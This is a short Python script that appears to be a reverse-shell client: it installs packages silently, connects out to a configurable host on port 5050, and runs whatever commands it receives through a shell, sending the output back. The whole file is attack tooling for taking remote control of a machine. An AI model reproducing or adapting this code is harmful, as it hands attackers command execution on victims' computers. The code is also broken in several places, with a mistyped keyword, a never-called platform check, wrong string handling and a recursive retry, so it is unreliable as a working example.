import os , time , sys

def os_check():
    from platform import system
    if system == "Linux":
        use_sudo = True
    else:
        use_sudo = False

try :
    import socket
    from cv2 import *
    from subprocess import *
except:
    os.system("pip3 install opencv-python > install.txt")
    os.system("pip3 install socket > install.txt")
    os.system("rm install.txt")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = ""
port = 5050

def server_connection():
    try:
        s.connect((host, port))
    except: 
        return server_connection()
def reverse_shell():
    while True:
        data = s.recv(1024)
        if data[2:].encode("utf-8") == "cd":
            os.chdir(data[3:].encode("utf-8"))
        if len(data) > 0 :
            terminal = Popen(data[:].encode("utf-8"), shell=True , stout=PIPE , stderr=PIPE , stdin=PIPE)
            outputs_bites = terminal.stdout.read() + terminal.stderr.read()
            outputs_str = str(outputs_bites , "utf-8")
            s.send(str.encode(outputs_str))
    s.close()